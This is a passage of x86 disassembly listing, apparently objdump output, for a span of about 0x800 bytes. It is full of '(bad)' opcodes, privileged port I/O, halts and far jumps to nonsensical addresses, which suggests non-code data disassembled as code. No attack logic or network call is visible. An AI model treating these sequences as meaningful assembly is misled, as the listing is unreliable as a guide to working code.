  406cb7:	pop    esi
  406cb8:	and    eax,0x6b2c70
  406cbd:	adc    esp,DWORD PTR [edx-0xef2eb2b]
  406cc3:	(bad)  
  406cc4:	aam    0xa8
  406cc6:	cmp    dh,BYTE PTR [esp+ebp*2]
  406cc9:	fldenv [ebx]
  406ccb:	enter  0x4a04,0x85
  406ccf:	mov    bl,0x62
  406cd1:	in     eax,dx
  406cd2:	fisubr WORD PTR [eax]
  406cd4:	xor    eax,0xd455f84a
  406cd9:	test   ebp,ecx
  406cdb:	inc    eax
  406cdc:	sbb    ecx,DWORD PTR [ecx+0x42aac258]
  406ce2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ce3:	les    ebp,FWORD PTR [ebx+0x175fd74e]
  406ce9:	dec    edi
  406cea:	mov    fs,WORD PTR [esi]
  406cec:	cmp    cl,BYTE PTR [edi]
  406cee:	repz fidiv WORD PTR [edx+0x71]
  406cf2:	mov    dh,0xa7
  406cf4:	cmp    eax,0xa22468a5
  406cf9:	or     dl,BYTE PTR [esi]
  406cfb:	mov    esp,0x51232796
  406d00:	pop    ecx
  406d01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d02:	les    eax,FWORD PTR [eax+ecx*4]
  406d05:	cmp    al,0xae
  406d07:	repz in ax,0x53
  406d0b:	cmp    cl,BYTE PTR [esi+0x50]
  406d0e:	pop    esp
  406d0f:	out    dx,al
  406d10:	into   
  406d11:	mov    ds:0xed874da3,al
  406d16:	test   eax,0xe7cd2d2
  406d1b:	sub    DWORD PTR [edi],esp
  406d1d:	and    DWORD PTR [eax],0x7229984c
  406d23:	xchg   esp,eax
  406d24:	cmp    eax,0xe2596ac6
  406d29:	or     BYTE PTR [edx+eax*8+0x29],bh
  406d2d:	pop    esp
  406d2e:	(bad)
  406d31:	push   esi
  406d32:	xor    DWORD PTR [ebx+0x2233f3b5],ecx
  406d38:	test   eax,0xe00a735d
  406d3d:	aad    0x3d
  406d3f:	in     eax,0x0
  406d41:	mov    cl,0x2
  406d43:	or     bl,cl
  406d45:	rcl    DWORD PTR [eax],1
  406d47:	inc    esp
  406d48:	jl     0x406d87
  406d4a:	inc    esi
  406d4b:	test   al,0x18
  406d4d:	(bad)  
  406d4f:	idiv   ah
  406d51:	ins    DWORD PTR es:[edi],dx
  406d52:	xor    eax,0x6742cf1
  406d57:	leave  
  406d58:	or     eax,0xf09b65bb
  406d5d:	hlt    
  406d5e:	push   ebx
  406d5f:	rcl    BYTE PTR [esi-0x2e38b6da],cl
  406d65:	xchg   DWORD PTR [ebx+edi*8-0x5e],edi
  406d69:	xchg   ebx,eax
  406d6a:	inc    ecx
  406d6b:	mov    dh,0x2e
  406d6d:	jne    0x406d56
  406d6f:	imul   esi,ebx,0x62
  406d72:	or     cl,dl
  406d74:	inc    eax
  406d75:	or     eax,0x2ca223a
  406d7a:	imul   DWORD PTR [ecx+0x43]
  406d7d:	stos   DWORD PTR es:[edi],eax
  406d7e:	xlat   BYTE PTR ds:[ebx]
  406d80:	push   edi
  406d81:	lock mov ds:0xa4aabb13,eax
  406d87:	mov    ds:0x5dac39b,eax
  406d8c:	mov    bl,0xb9
  406d8e:	add    al,BYTE PTR [ecx-0x1a03b5e5]
  406d94:	mov    bh,0xc
  406d96:	xor    esp,edi
  406d98:	sbb    al,0x68
  406d9a:	inc    eax
  406d9b:	cmp    dh,0x8b
  406d9e:	pop    eax
  406d9f:	inc    eax
  406da0:	popf   
  406da1:	jne    0x406d6a
  406da3:	cmp    eax,0x3985434b
  406da8:	mov    bl,0x7f
  406daa:	mov    ebx,0x8bfb8254
  406daf:	enter  0xadbc,0x6
  406db3:	mov    al,0x4a
  406db5:	scas   eax,DWORD PTR es:[edi]
  406db6:	repz cmp bl,BYTE PTR [ecx-0x34b929f1]
  406dbd:	jl     0x406dfe
  406dbf:	test   al,0x6b
  406dc1:	dec    edi
  406dc2:	call   0xdc0a:0xb72f8ec4
  406dc9:	adc    eax,0xc8240385
  406dce:	arpl   WORD PTR [esi*1+0x45d8ee40],cx
  406dd5:	rol    bh,cl
  406dd7:	pop    ecx
  406dd8:	rol    BYTE PTR [edx-0x6],1
  406ddb:	in     al,dx
  406ddc:	leave  
  406ddd:	lock lock xchg ebx,eax
  406de0:	fsubr  DWORD PTR [eax]
  406de2:	hlt    
  406de3:	(bad)  
  406de4:	cmp    al,0x54
  406de6:	and    al,0x2b
  406de8:	pop    edi
  406de9:	pop    ds
  406dea:	mov    bl,0xd6
  406dec:	out    0x5c,al
  406dee:	xchg   ebp,eax
  406def:	xchg   DWORD PTR [ebx*1-0x698b6dc2],esi
  406df6:	add    eax,0x97b4c39c
  406dfb:	cld    
  406dfc:	lahf   
  406dfd:	imul   esp,DWORD PTR [eax+0x7f11a4e0],0x6e9acdb7
  406e07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e08:	or     al,0xa5
  406e0a:	icebp  
  406e0b:	ret    
  406e0c:	int3   
  406e0d:	je     0x406dcb
  406e0f:	pop    edi
  406e10:	ins    DWORD PTR es:[edi],dx
  406e11:	xchg   edx,eax
  406e12:	call   0xd467d81e
  406e17:	sbb    al,0x6
  406e19:	mov    ecx,0x92a1d1fa
  406e1e:	retf   
  406e1f:	int    0x43
  406e21:	adc    eax,0x10fb75de
  406e26:	xchg   ecx,eax
  406e27:	nop
  406e28:	js     0x406e91
  406e2a:	mov    dl,0x66
  406e2c:	push   esp
  406e2d:	or     esp,DWORD PTR [ebx]
  406e2f:	call   0xf27ad6d3
  406e34:	dec    ebx
  406e35:	jl     0x406deb
  406e37:	xor    eax,edi
  406e39:	test   eax,0xfc89ae0c
  406e3e:	or     bl,al
  406e40:	ss in  eax,dx
  406e42:	cmp    eax,0xc0ba6581
  406e47:	(bad)  
  406e48:	out    0xfc,al
  406e4a:	loop   0x406e8b
  406e4c:	or     eax,0x34ea3ba3
  406e51:	pop    edx
  406e52:	cmp    BYTE PTR [ebp-0x3274eea3],ah
  406e58:	leave  
  406e59:	fnstcw WORD PTR [esi-0x7155ad70]
  406e5f:	daa    
  406e60:	rol    BYTE PTR [eax-0x428cdaf],1
  406e66:	sub    eax,0x67577cfa
  406e6b:	and    edi,DWORD PTR ds:0xb3be21cf
  406e71:	cmp    cl,BYTE PTR [edi-0x3d0d1335]
  406e77:	nop
  406e78:	or     DWORD PTR [edx],0x8e821fed
  406e7e:	stc    
  406e7f:	scas   eax,DWORD PTR es:[edi]
  406e80:	xor    BYTE PTR [esi+0x2347daa7],cl
  406e86:	push   esp
  406e87:	test   cl,0xac
  406e8a:	imul   esp
  406e8c:	mov    ebp,0x4dc5dc76
  406e91:	(bad)  
  406e92:	gs cmp ah,ah
  406e95:	imul   DWORD PTR [ecx]
  406e97:	jo     0x406efe
  406e99:	push   ds
  406e9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e9b:	jle    0x406e53
  406e9d:	aam    0x7d
  406e9f:	shl    BYTE PTR [eax],1
  406ea1:	gs test al,0xe9
  406ea4:	adc    BYTE PTR [edi],dh
  406ea6:	sar    BYTE PTR [ebx+0x43],1
  406ea9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406eaa:	mov    esp,DWORD PTR [ebp*1+0x77a39853]
  406eb1:	xchg   ebx,eax
  406eb2:	shl    ebx,cl
  406eb4:	ret    0x7f15
  406eb7:	retf   
  406eb8:	test   al,0xb8
  406eba:	icebp  
  406ebb:	scas   eax,DWORD PTR es:[edi]
  406ebc:	ss jbe 0x406e6b
  406ebf:	adc    al,0x60
  406ec1:	sbb    eax,0x1e735c4d
  406ec6:	clc    
  406ec7:	call   0xfd2a:0xcb27afd5
  406ece:	dec    eax
  406ecf:	sti    
  406ed0:	leave  
  406ed1:	or     DWORD PTR [ecx],eax
  406ed3:	ins    DWORD PTR es:[edi],dx
  406ed4:	mov    edx,0xcb8e0ed7
  406ed9:	dec    esp
  406eda:	int3   
  406edb:	fs jmp 0x1ca8:0x10cca384
  406ee3:	dec    edi
  406ee4:	fisttp DWORD PTR [esi+0x41d356f4]
  406eea:	xchg   edx,eax
  406eeb:	add    DWORD PTR [ecx],0xffc825a2
  406ef1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ef2:	cdq    
  406ef3:	shl    BYTE PTR [ebx],cl
  406ef5:	clc    
  406ef6:	ret    0x8f14
  406ef9:	mov    bh,0x98
  406efb:	sub    al,0xf2
  406efd:	sbb    ah,cl
  406eff:	sub    al,0x16
  406f01:	push   edx
  406f02:	inc    eax
  406f03:	sbb    ebx,DWORD PTR [ecx+eax*2+0x3a]
  406f07:	cli    
  406f08:	fsubr  QWORD PTR [ecx]
  406f0a:	not    DWORD PTR [esi+0x7a3962dd]
  406f10:	das    
  406f11:	test   BYTE PTR [esi+0xf],0x51
  406f15:	out    dx,al
  406f16:	(bad)  
  406f17:	add    eax,DWORD PTR [ebx+0x16]
  406f1a:	xlat   BYTE PTR ds:[ebx]
  406f1b:	inc    esi
  406f1c:	jmp    0x9bdf:0x51c9fbee
  406f23:	push   es
  406f24:	fidivr DWORD PTR [edx-0x46]
  406f27:	cli    
  406f28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f29:	jnp    0x406f9f
  406f2b:	add    DWORD PTR [edx-0x57],edx
  406f2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f2f:	mov    ch,0x9
  406f31:	in     al,0x13
  406f33:	(bad)  
  406f34:	in     al,dx
  406f35:	scas   al,BYTE PTR es:[edi]
  406f36:	xchg   ebp,eax
  406f37:	out    0x6b,al
  406f39:	(bad)  
  406f3a:	into   
  406f3b:	dec    ebp
  406f3c:	pop    ds
  406f3d:	scas   al,BYTE PTR es:[edi]
  406f3e:	and    dh,cl
  406f40:	xchg   edx,eax
  406f41:	dec    ebp
  406f42:	xor    dh,dl
  406f44:	pop    esp
  406f45:	jo     0x406f2f
  406f47:	pop    ss
  406f48:	fmul   st,st(6)
  406f4a:	pop    ebp
  406f4b:	lock jle 0x406edd
  406f4e:	push   edx
  406f4f:	gs mov esi,0x2a233d78
  406f55:	hlt    
  406f56:	pop    ecx
  406f57:	cdq    
  406f58:	dec    esi
  406f59:	sub    esi,edx
  406f5b:	xchg   DWORD PTR [ebp+0x6e],esp
  406f5e:	in     eax,dx
  406f5f:	sub    eax,0x178563b1
  406f64:	mov    eax,0x6d9f87d8
  406f69:	mul    DWORD PTR [eax]
  406f6b:	imul   esi,DWORD PTR [edx],0xe9c16233
  406f71:	retf   0x4204
  406f74:	sbb    ch,BYTE PTR [ebx+0x5a]
  406f77:	xchg   ecx,eax
  406f78:	fisttp QWORD PTR [eax]
  406f7a:	dec    ebp
  406f7b:	xchg   edx,eax
  406f7c:	jecxz  0x406f89
  406f7e:	mov    ch,0x99
  406f80:	inc    edi
  406f81:	scas   eax,DWORD PTR es:[edi]
  406f82:	shl    DWORD PTR [ecx-0x73],0x20
  406f86:	sti    
  406f87:	das    
  406f88:	enter  0xaa23,0x7c
  406f8c:	lods   eax,DWORD PTR ds:[esi]
  406f8d:	mov    al,ds:0x87144590
  406f92:	pop    ebp
  406f93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f94:	lds    ebx,FWORD PTR [eax-0x750e2fd2]
  406f9a:	imul   edi,DWORD PTR [ebp+0x71],0x6a8a81eb
  406fa1:	or     al,0x8c
  406fa3:	pop    edx
  406fa4:	xor    al,0x2b
  406fa6:	add    al,0x9f
  406fa8:	sub    al,BYTE PTR [eax-0x7d52a9bb]
  406fae:	lods   eax,DWORD PTR ds:[esi]
  406faf:	mov    ah,0x45
  406fb1:	pop    ebx
  406fb2:	lods   al,BYTE PTR ds:[esi]
  406fb3:	fimul  DWORD PTR [edx-0x61b4b213]
  406fb9:	xor    esp,ecx
  406fbb:	sbb    eax,DWORD PTR [ebx+ebx*4+0x43]
  406fbf:	mov    edi,0x73be2d1c
  406fc4:	pop    eax
  406fc5:	loope  0x406f95
  406fc7:	push   ds
  406fc8:	jo     0x406f72
  406fca:	lods   eax,DWORD PTR ds:[esi]
  406fcb:	pop    edx
  406fcc:	repz enter 0xa051,0x6f
  406fd1:	frstor [esi-0x2a]
  406fd4:	sub    al,0x4f
  406fd6:	push   ds
  406fd7:	bound  edx,QWORD PTR [eax-0x4670d441]
  406fdd:	es jg  0x406fe5
  406fe0:	outs   dx,BYTE PTR ds:[esi]
  406fe1:	loope  0x407058
  406fe3:	inc    esi
  406fe4:	test   DWORD PTR [edi-0xc],edi
  406fe7:	loop   0x406fc1
  406fe9:	sbb    al,BYTE PTR [edx+0x4b]
  406fec:	cdq    
  406fed:	test   eax,0x245e351e
  406ff2:	push   0x1c
  406ff4:	xor    DWORD PTR [edx],ecx
  406ff6:	retf   0xb975
  406ff9:	pop    ss
  406ffa:	pop    esp
  406ffb:	adc    DWORD PTR [esi],0xffffffb5
  406ffe:	push   esi
  406fff:	mov    ds:0x36655dcc,eax
  407004:	sbb    cl,bl
  407006:	sub    DWORD PTR [ecx+0x8],eax
  407009:	shl    DWORD PTR [esi],0xcd
  40700c:	inc    edi
  40700d:	xchg   esp,eax
  40700e:	fiadd  WORD PTR [ebx]
  407010:	push   eax
  407011:	std    
  407012:	push   eax
  407013:	mov    ch,0x89
  407015:	xor    eax,0x5b498925
  40701a:	scas   al,BYTE PTR es:[edi]
  40701b:	jns    0x406fa7
  40701d:	push   esp
  40701e:	xchg   edi,eax
  40701f:	loope  0x407010
  407021:	pop    ss
  407022:	retf   0x5062
  407025:	adc    ebp,DWORD PTR [edx+ebx*2+0x17]
  407029:	mov    dh,0x28
  40702b:	ins    DWORD PTR es:[edi],dx
  40702c:	cmp    DWORD PTR [esi],0x40b95a61
  407032:	fs int3 
  407034:	xchg   ebx,eax
  407035:	les    edi,FWORD PTR [edx+0x1b41a69e]
  40703b:	stos   BYTE PTR es:[edi],al
  40703c:	push   edx
  40703d:	sbb    esi,DWORD PTR [edx]
  40703f:	mov    ebp,0x186749a
  407044:	mov    ss,WORD PTR [eax]
  407046:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407047:	mov    WORD PTR [esi+edx*2+0x331205d0],fs
  40704e:	jb     0x407016
  407050:	pop    ebp
  407051:	addr16 or ecx,0xef7e942a
  407058:	adc    al,0xcf
  40705a:	cmp    eax,0xfd3a670a
  40705f:	pop    edx
  407060:	pop    esi
  407061:	or     DWORD PTR [ebx-0x74],edi
  407064:	xchg   ebx,eax
  407065:	pop    eax
  407066:	(bad)
  40706a:	shl    DWORD PTR [esi],cl
  40706c:	lds    edx,FWORD PTR [ecx+0x3d8540d0]
  407072:	or     DWORD PTR [esi],0xc5ef2dee
  407078:	push   edi
  407079:	fs fdivr st(1),st
  40707c:	push   ds
  40707d:	push   ss
  40707e:	sub    dh,BYTE PTR [ecx+0x9]
  407081:	fwait
  407082:	jnp    0x4070ba
  407084:	xchg   esi,eax
  407085:	add    dl,BYTE PTR [edi+ebp*4-0x72fcffce]
  40708c:	into   
  40708d:	pop    ss
  40708e:	fcmovu st,st(5)
  407090:	out    dx,al
  407091:	les    esi,FWORD PTR [ecx+0x13]
  407094:	imul   edi,DWORD PTR [edx-0x19b66b82],0xa75cc2ac
  40709e:	pop    edi
  40709f:	out    dx,al
  4070a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070a1:	out    dx,eax
  4070a2:	loopne 0x4070ea
  4070a4:	out    0x6a,al
  4070a6:	xor    eax,0x48567666
  4070ab:	xchg   ecx,eax
  4070ac:	pop    esp
  4070ad:	neg    BYTE PTR [eax+esi*1]
  4070b0:	sbb    ebx,ecx
  4070b2:	push   es
  4070b3:	mov    edi,0x7c3e5497
  4070b8:	outs   dx,DWORD PTR ds:[esi]
  4070b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070ba:	dec    edx
  4070bb:	in     al,0xf8
  4070bd:	mov    ch,0x2c
  4070bf:	outs   dx,DWORD PTR ds:[esi]
  4070c0:	or     DWORD PTR [eax+edx*8],esp
  4070c3:	mov    ecx,0x6665f5dd
  4070c8:	xchg   esi,eax
  4070c9:	bound  esi,QWORD PTR [edx+eiz*2-0x6e]
  4070cd:	mov    bl,0xd9
  4070cf:	jnp    0x4070f9
  4070d1:	imul   edx,DWORD PTR es:[ebx-0x29],0xe8ac29da
  4070d9:	(bad)  
  4070da:	jp     0x407144
  4070dc:	stos   DWORD PTR es:[edi],eax
  4070dd:	pop    edx
  4070de:	in     al,dx
  4070df:	in     eax,0xb3
  4070e1:	out    0x9f,al
  4070e3:	mov    ds:0x1d61b336,al
  4070e8:	repz and eax,0x7a8863eb
  4070ee:	fs inc esi
  4070f0:	xor    edi,DWORD PTR [ebx]
  4070f2:	xor    al,0xb5
  4070f4:	push   ds
  4070f5:	fist   DWORD PTR [eax+0x1312158d]
  4070fb:	jmp    0x407144
  4070fd:	pop    ecx
  4070fe:	add    esi,DWORD PTR [edx+0x6ce0d24]
  407104:	aaa    
  407105:	pop    eax
  407106:	cmc    
  407107:	lods   eax,DWORD PTR ds:[esi]
  407108:	scas   eax,DWORD PTR es:[edi]
  407109:	and    DWORD PTR ss:[ebx],esp
  40710c:	jnp    0x4070a6
  40710e:	xlat   BYTE PTR ds:[ebx]
  40710f:	arpl   ax,cx
  407111:	bound  ebx,QWORD PTR [edx]
  407113:	pop    eax
  407114:	cmp    edi,DWORD PTR [ebx*4-0x6651f8e8]
  40711b:	rcr    esi,0x50
  40711e:	cmp    ebx,DWORD PTR ds:0xf8ef9595
  407124:	and    BYTE PTR [ebx+0x67],ch
  407127:	xor    al,0xcd
  407129:	mov    bh,0xe8
  40712b:	push   ebx
  40712c:	loop   0x40719f
  40712e:	xchg   DWORD PTR ss:[esi+0x3e921b86],esi
  407135:	std    
  407136:	adc    DWORD PTR [esi+0x19],0xc
  40713a:	mov    ecx,0xc7e7337a
  40713f:	pop    ebp
  407140:	test   al,0x5
  407142:	scas   eax,DWORD PTR es:[edi]
  407143:	idiv   ebx
  407145:	push   es
  407146:	dec    esp
  407147:	jmp    0x40717e
  407149:	arpl   WORD PTR [edi-0xe],si
  40714c:	mov    edx,0x60f4e9fd
  407151:	pop    ss
  407152:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407153:	sub    BYTE PTR [edx],0x9a
  407156:	mov    ebp,0x9080299b
  40715b:	mov    edx,0xe5b9cc8d
  407160:	rcl    BYTE PTR [ebp-0x62],0xfa
  407164:	inc    esp
  407165:	lods   eax,DWORD PTR ds:[esi]
  407166:	sbb    DWORD PTR [ebx+0x425b3508],edi
  40716c:	mov    ch,0xd9
  40716e:	push   esi
  40716f:	mov    dl,0xc1
  407171:	shl    bl,1
  407173:	fild   QWORD PTR [eax-0x8]
  407176:	adc    cl,BYTE PTR [esi-0xb2aef23]
  40717c:	adc    ah,BYTE PTR [edi+0x7815011a]
  407182:	aaa    
  407183:	mov    esi,0x21036b8d
  407188:	sbb    DWORD PTR [ebp-0x3],eax
  40718b:	inc    edi
  40718c:	or     dh,al
  40718e:	rcr    BYTE PTR [esi+0x5a],1
  407191:	popa   
  407192:	dec    ebp
  407193:	xor    DWORD PTR [eax-0x1f639b22],eax
  407199:	fcmovnbe st,st(3)
  40719b:	ja     0x66270838
  4071a1:	xor    DWORD PTR [ebp-0xd],esp
  4071a4:	leave  
  4071a5:	das    
  4071a6:	jns    0x40719f
  4071a8:	push   edi
  4071a9:	fimul  DWORD PTR [edx+0x7347a2ca]
  4071af:	mov    al,0x9f
  4071b1:	in     eax,dx
  4071b2:	xor    DWORD PTR [ebx+0x5c],edi
  4071b5:	add    DWORD PTR [esi+esi*4-0x3ca1c86f],ecx
  4071bc:	add    bl,dh
  4071be:	cli    
  4071bf:	les    esp,FWORD PTR [ecx+0x2b]
  4071c2:	mov    ds:0x38047ef,al
  4071c7:	call   0x1875:0xb49e52d0
  4071ce:	data16 sbb bl,BYTE PTR [edi+ebx*1+0x19]
  4071d3:	inc    esi
  4071d4:	call   0xfb932c6e
  4071d9:	push   ecx
  4071da:	xor    esp,0x11
  4071dd:	adc    ecx,DWORD PTR [ebx-0x4e]
  4071e0:	sar    bl,cl
  4071e2:	mov    ebp,0x1b9773b5
  4071e7:	lea    ecx,[ecx+ecx*2-0x411cec60]
  4071ee:	cli    
  4071ef:	jp     0x4071fc
  4071f1:	in     eax,dx
  4071f2:	adc    DWORD PTR [esi+0x58],ebx
  4071f5:	lock sub DWORD PTR [ebx-0x32],esp
  4071f9:	inc    ecx
  4071fa:	js     0x4071de
  4071fc:	rol    edi,1
  4071fe:	dec    esp
  4071ff:	in     eax,0xab
  407201:	inc    edx
  407202:	sbb    BYTE PTR [ebx+0x33869e30],0xc5
  407209:	pusha  
  40720a:	enter  0x659f,0x6d
  40720e:	add    eax,0xad5862cc
  407213:	not    BYTE PTR [esi]
  407215:	or     BYTE PTR [ecx],bl
  407217:	(bad)  
  407218:	(bad)  [ebp-0x1d]
  40721b:	ss ret 0xfe71
  40721f:	push   0x8e9e8839
  407224:	mov    al,0xb7
  407226:	jl     0x4071ac
  407228:	sbb    edi,DWORD PTR [eax]
  40722a:	ret    
  40722b:	pop    esp
  40722c:	push   ebx
  40722d:	cmp    ebp,DWORD PTR [ecx+0x3ea95df5]
  407233:	jno    0x4071f5
  407235:	dec    edx
  407236:	xlat   BYTE PTR ds:[ebx]
  407237:	imul   ecx,edx,0xfffffff7
  40723a:	mov    al,0x6b
  40723c:	frstor [ebx+edx*8]
  40723f:	dec    ebp
  407240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407241:	cmc    
  407242:	jg     0x407278
  407244:	jecxz  0x4072c0
  407246:	pop    ecx
  407247:	ds pop ebx
  407249:	mov    ch,0xe6
  40724b:	scas   eax,DWORD PTR es:[edi]
  40724c:	jne    0x4071ce
  40724e:	fstp   DWORD PTR [ecx-0x5f]
  407251:	inc    edx
  407252:	pop    ss
  407253:	sub    dl,BYTE PTR [edx+eax*2+0x14]
  407257:	mov    cl,0xf2
  407259:	mov    ds:0x3f7c92d2,al
  40725e:	sbb    BYTE PTR [ebx+0x2f],dh
  407261:	test   al,0x88
  407263:	and    eax,0xb84beaad
  407268:	imul   ebp,DWORD PTR [edi],0x9e0da338
  40726e:	xlat   BYTE PTR ds:[ebx]
  40726f:	test   BYTE PTR [eax-0x2ef62957],ch
  407275:	xchg   esi,eax
  407276:	test   eax,0x342b4553
  40727b:	out    0x87,eax
  40727d:	or     al,0xd0
  40727f:	je     0x4072dd
  407281:	or     BYTE PTR [ebx],al
  407283:	imul   ebp,DWORD PTR [edx+ebx*8],0x53
  407287:	test   al,0x13
  407289:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40728a:	xor    al,0x14
  40728c:	xchg   ebx,eax
  40728d:	add    DWORD PTR [edx+esi*8],esi
  407290:	cmc    
  407291:	add    bh,BYTE PTR ds:[ebp+0x45]
  407295:	push   ds
  407296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407297:	cld    
  407298:	stos   BYTE PTR es:[edi],al
  407299:	pop    esp
  40729a:	outs   dx,BYTE PTR ds:[esi]
  40729b:	push   edx
  40729c:	mov    dh,0x4
  40729e:	push   es
  40729f:	dec    edi
  4072a0:	(bad)  
  4072a1:	leave  
  4072a2:	inc    ebx
  4072a3:	jo     0x40731f
  4072a5:	outs   dx,BYTE PTR ds:[esi]
  4072a6:	sbb    DWORD PTR [eax-0xc472f39],ebp
  4072ac:	imul   edx,DWORD PTR [ebp-0x110d0737],0xa6bc20f1
  4072b6:	jns    0x407258
  4072b8:	mov    BYTE PTR [edx],dl
  4072ba:	and    eax,0x50860496
  4072bf:	jle    0x407321
  4072c1:	data16 sbb cl,cl
  4072c4:	jmp    0x41d0:0xc4267aba
  4072cb:	push   ebx
  4072cc:	pushf  
  4072cd:	pop    ds
  4072ce:	and    BYTE PTR [eax+eiz*2],bh
  4072d1:	lahf   
  4072d2:	jne    0x40730d
  4072d4:	loope  0x4072ce
  4072d6:	hlt    
  4072d7:	add    BYTE PTR [edi+esi*8],cl
  4072da:	dec    ebp
  4072db:	xor    BYTE PTR [ebx-0x25],ch
  4072de:	push   cs
  4072df:	retf   0xbe91
  4072e2:	fs popf 
  4072e4:	mov    cl,0xdd
  4072e6:	loop   0x407336
  4072e8:	stc    
  4072e9:	push   ebp
  4072ea:	mov    bl,bl
  4072ec:	mov    es,WORD PTR [edi+edx*8+0x1b]
  4072f0:	mov    al,0x69
  4072f2:	mov    esp,edi
  4072f4:	add    bh,BYTE PTR [edx]
  4072f6:	push   0x7c855e7f
  4072fb:	adc    edx,DWORD PTR [edi-0x56]
  4072fe:	fld    TBYTE PTR [edx+0x34]
  407301:	pop    ebx
  407302:	or     BYTE PTR ds:0x52fe0a0,dh
  407308:	sbb    al,0x10
  40730a:	cmp    al,0x80
  40730c:	mov    DWORD PTR [edi-0x75339d19],esi
  407312:	js     0x407361
  407314:	mov    al,ds:0x214db28f
  407319:	mov    ?,WORD PTR [ebp-0x3cd445d8]
  40731f:	dec    ebp
  407320:	fdivrp st(2),st
  407322:	clc    
  407323:	popa   
  407324:	mov    ecx,0x57e21bbd
  407329:	jle    0x407375
  40732b:	fdiv   st(5),st
  40732d:	jae    0x40732a
  40732f:	push   cs
  407330:	mov    esp,0xcaa33140
  407335:	inc    edx
  407336:	ins    DWORD PTR es:[edi],dx
  407337:	xor    edx,DWORD PTR [edx-0x3e]
  40733a:	rol    DWORD PTR [edx+0x6c18b896],0xef
  407341:	int    0x90
  407343:	pusha  
  407344:	pop    esi
  407345:	dec    ebp
  407346:	rcr    BYTE PTR [eax-0x583f9405],1
  40734c:	xor    BYTE PTR [edx-0x60],dl
  40734f:	add    edx,ecx
  407351:	mov    edi,0xfe7216a6
  407356:	push   cx
  407358:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407359:	xbegin 0xc7d5b435
  40735f:	sub    BYTE PTR [ebx],0x74
  407362:	iret   
  407363:	cmp    DWORD PTR ds:0xf8b2502a,eax
  407369:	int3   
  40736a:	inc    edi
  40736b:	sub    BYTE PTR [ebp+0x3d],0x6f
  40736f:	cmp    eax,0x2bac233d
  407374:	pop    ss
  407375:	pop    ecx
  407376:	es popa 
  407378:	mov    al,BYTE PTR [esp+edx*4+0x35b92e70]
  40737f:	push   ebp
  407380:	mov    ah,0x3b
  407382:	cli    
  407383:	add    bh,cl
  407385:	inc    edx
  407386:	add    al,dl
  407388:	(bad)  
  40738b:	data16 mov bl,0xf4
  40738e:	xchg   esp,eax
  40738f:	js     0x407401
  407391:	pop    ebp
  407392:	pop    edx
  407393:	sti    
  407394:	adc    al,0x89
  407396:	imul   edx,DWORD PTR [esi+0x11476f87],0xffffffaf
  40739d:	(bad)  
  40739e:	jmp    0x9e0a7c8d
  4073a3:	add    DWORD PTR [edx+ecx*1+0x180cd8c4],esi
  4073aa:	stc    
  4073ab:	pop    ebp
  4073ac:	outs   dx,BYTE PTR ds:[esi]
  4073ad:	adc    eax,0x425877e8
  4073b2:	mov    bl,0x1c
  4073b4:	cli    
  4073b5:	mov    esp,0x37057722
  4073ba:	(bad)  
  4073bb:	sti    
  4073bc:	push   edi
  4073bd:	ficom  WORD PTR [ecx]
  4073bf:	push   es
  4073c0:	jge    0x407431
  4073c2:	sbb    bl,BYTE PTR [eax]
  4073c4:	add    eax,0x27fbf3c1
  4073c9:	clc    
  4073ca:	aaa    
  4073cb:	mov    esi,0x7a945b9
  4073d0:	call   0x123a:0x2caca746
  4073d7:	cdq    
  4073d8:	cmp    al,0x42
  4073da:	jecxz  0x407420
  4073dc:	(bad)  
  4073de:	xlat   BYTE PTR ds:[ebx]
  4073df:	int3   
  4073e0:	inc    ebp
  4073e1:	adc    BYTE PTR [ebx],ah
  4073e3:	push   ds
  4073e4:	rcl    esi,0x54
  4073e7:	loop   0x40738a
  4073e9:	xlat   BYTE PTR ds:[ebx]
  4073ea:	ja     0x407441
  4073ec:	sti    
  4073ed:	loop   0x4073ac
  4073ef:	out    dx,al
  4073f0:	(bad)  
  4073f1:	mov    esp,0xa8ebb821
  4073f6:	(bad)  
  4073f7:	cmp    BYTE PTR [esi+0x6],al
  4073fa:	dec    esi
  4073fb:	or     eax,0xca37f02c
  407400:	icebp  
  407401:	sub    al,0x8d
  407403:	push   0x13
  407405:	scas   eax,DWORD PTR es:[edi]
  407406:	in     al,0x15
  407408:	data16 into 
  40740a:	sbb    dh,BYTE PTR [edx-0x38]
  40740d:	icebp  
  40740e:	fild   WORD PTR [edx-0x2]
  407411:	lahf   
  407412:	dec    eax
  407413:	dec    esi
  407414:	jle    0x407477
  407416:	jl     0x40740c
  407418:	out    dx,al
  407419:	loope  0x4073ec
  40741b:	lock popf 
  40741d:	xor    eax,0xa86259d4
  407422:	sub    BYTE PTR [ebx+edi*2],bh
  407425:	ds pop esp
  407427:	pop    ecx
  407428:	or     BYTE PTR [ecx],0xb4
  40742b:	mov    cs,WORD PTR [eax]
  40742d:	int    0xef
  40742f:	mov    ch,0x1a
  407431:	not    DWORD PTR [ecx+0x5df8e46]
  407437:	pop    edx
  407438:	push   edx
  407439:	sbb    DWORD PTR [eax+0x37e47dae],eax
  40743f:	lock popa 
  407441:	or     al,0xd9
  407443:	(bad)  
  407444:	pop    ebx
  407445:	test   eax,0xe96bcf5d
  40744a:	dec    ecx
  40744b:	inc    edx
  40744c:	lds    ebp,FWORD PTR [ebx+0x0]
  40744f:	popf   
  407450:	and    cl,bl
  407452:	mov    esp,0xd29d733e
  407457:	and    eax,DWORD PTR [ebx]
  407459:	repnz aam 0xe1
  40745c:	pop    sp
  40745e:	push   eax
  40745f:	shr    DWORD PTR gs:[ebx+0x6c],cl
